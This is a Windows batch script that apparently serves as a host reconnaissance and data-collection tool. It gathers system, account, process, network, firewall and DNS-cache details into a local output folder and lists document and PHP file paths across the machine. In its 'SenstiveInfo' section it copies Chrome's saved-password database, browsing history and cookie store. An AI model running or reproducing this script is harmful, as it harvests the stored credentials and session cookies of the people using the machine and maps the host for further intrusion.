@echo off

mkdir C:\Users\%username%\output\
mkdir C:\Users\%username%\output\File-paths\
mkdir C:\Users\%username%\output\Network-info\
mkdir C:\Users\%username%\output\System-info\
mkdir C:\Users\%username%\output\SenstiveInfo\

rem ---------------------------------------------------System info------------------------------------------------
rem Operating System Details

ver > C:\Users\%username%\output\System-info\OS.txt

systeminfo >> C:\Users\%username%\output\System-info\OS.txt


rem -- System Name&group 

set username > C:\Users\%username%\output\System-info\username.txt

set userdomain > C:\Users\%username%\output\System-info\domain-user.txt

set computername > C:\Users\%username%\output\System-info\MachineName.txt

net localgroup   > C:\Users\%username%\output\System-info\Groups-On-System.txt

net user 	 > C:\Users\%username%\output\System-info\users-On-Local-Machine.txt

net localgroup administrators > C:\Users\%username%\output\System-info\loacl-administrators.txt

:: -- View all mapped logical/shared drives on the system

wmic logicaldisk get caption,description,providername  > C:\Users\%username%\output\System-info\logical-OR-shared-drives-on-the-system.txt

tasklist			 > C:\Users\%username%\output\System-info\running-process.txt

schtasks /query /v /fo CSV 	> C:\Users\%username%\output\System-info\Schedule-Tasks.csv

:: ---------------------------------------------------Network Info------------------------------------------------

curl "http://myexternalip.com/raw" > C:\Users\%username%\output\Network-info\Public-IP.txt

ping 8.8.8.8 		> C:\Users\%username%\output\Network-info\Ping-packet.txt

ipconfig 		> C:\Users\%username%\output\Network-info\IP-config.txt

ipconfig /all	        > C:\Users\%username%\output\Network-info\IP-Full-config.txt

tracert google.com 	> C:\Users\%username%\output\Network-info\Route-ISP.txt

:: ---- Display the contents of the DNS Resolver Cache

ipconfig /displaydns    > C:\Users\%username%\output\Network-info\DNS-Resolver-Cache.txt


netstat -nao | findstr "LISTENING" 	> C:\Users\%username%\output\Network-info\Port-LISTENING.txt
netstat -nao | findstr "ESTABLISHED"	> C:\Users\%username%\output\Network-info\Port-ESTABLISHED.txt
netstat -nao | findstr "CLOSE_WAIT"	> C:\Users\%username%\output\Network-info\Port-CLOSE_WAIT.txt
netstat -nao | findstr "TIME_WAIT"	> C:\Users\%username%\output\Network-info\Port-TIME_WAIT.txt
netstat -nao | findstr "*:*"		> C:\Users\%username%\output\Network-info\Port-Empty.txt
netstat -e				> C:\Users\%username%\output\Network-info\Interface-Statistics.txt

arp -a			  > C:\Users\%username%\output\Network-info\Machines-around.txt

net share 		  > C:\Users\%username%\output\Network-info\dirctories-shared.txt
	
netsh firewall show config > C:\Users\%username%\output\Network-info\Firewall-config.txt


rem -------------------------Files Paths-------------------------------

cd Users\%username%\

dir /b /s *.php		> C:\Users\%username%\output\File-paths\PHP-Paths(User-HOME).txt

dir /b /s *.pdf		> C:\Users\%username%\output\File-paths\Pdf-Paths(User-HOME).txt

dir /b /s *.docx	> C:\Users\%username%\output\File-paths\Word-Paths(User-HOME).txt

dir /b /s *.xlsx	> C:\Users\%username%\output\File-paths\Excel-Paths(User-HOME).txt

dir /b /s *.txt		> C:\Users\%username%\output\File-paths\Text-Paths(User-HOME).txt


cd \ 

dir /b /s *.php		> C:\Users\%username%\output\File-paths\PHP-Paths(All-Machine).txt

dir /b /s *.pdf		> C:\Users\%username%\output\File-paths\Pdf-Paths(All-Machine).txt

dir /b /s *.docx	> C:\Users\%username%\output\File-paths\Word-Paths(All-Machine).txt

dir /b /s *.xlsx	> C:\Users\%username%\output\File-paths\Excel-Paths(All-Machine).txt

dir /b /s *.txt		> C:\Users\%username%\output\File-paths\Text-Paths(All-Machine).txt






rem ----------------------------------------Senstive INFO-------------------------------------


copy C:\Users\%username%\AppData\Local\Google\Chrome\"User Data"\Default\"Login Data" C:\Users\%username%\output\SenstiveInfo\

copy C:\Users\%username%\AppData\Local\Google\Chrome\"User Data"\Default\"History" C:\Users\%username%\output\SenstiveInfo\

copy C:\Users\%username%\AppData\Local\Google\Chrome\"User Data"\Default\"Cookies" C:\Users\%username%\output\SenstiveInfo\






rem -------------------------------------- wmic---------------------

rem wmic /node:"%username%" bios get serialnumber		> C:\Users\%username%\output\System-info\serialnumber.txt

rem -- Find stuff that starts on boot 			

wmic STARTUP GET Caption, Command, User  			> C:\Users\%username%\output\System-info\STARTUP-Apps.txt

wmic startup list full						> C:\Users\%username%\output\System-info\STARTUP-Apps-FullList.txt

wmic useraccount get name,sid 					> C:\Users\%username%\output\System-info\user-SID.txt

rem BIOS Serial Number
wmic bios get serialnumber   					> C:\Users\%username%\output\System-info\bios-serial.txt

rem Motherboards Model and Number
wmic baseboard get product 					> C:\Users\%username%\output\System-info\baseboard.txt 
	
rem RAM or Physical Memory Size
wmic COMPUTERSYSTEM get TotalPhysicalMemory			> C:\Users\%username%\output\System-info\RAM-Size.txt
 
rem Partition Name, Size, and Type
wmic partition get name,size,type  				> C:\Users\%username%\output\System-info\Partition-info.txt


wmic os list brief 						> C:\Users\%username%\output\System-info\OS-brief.txt	


rem---------------------------------------PowerShell Command------------------------------

powershell "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize > C:\Users\%username%\output\System-info\InstalledProgramsPS.txt"





rem---------------------------------end of script----------------------





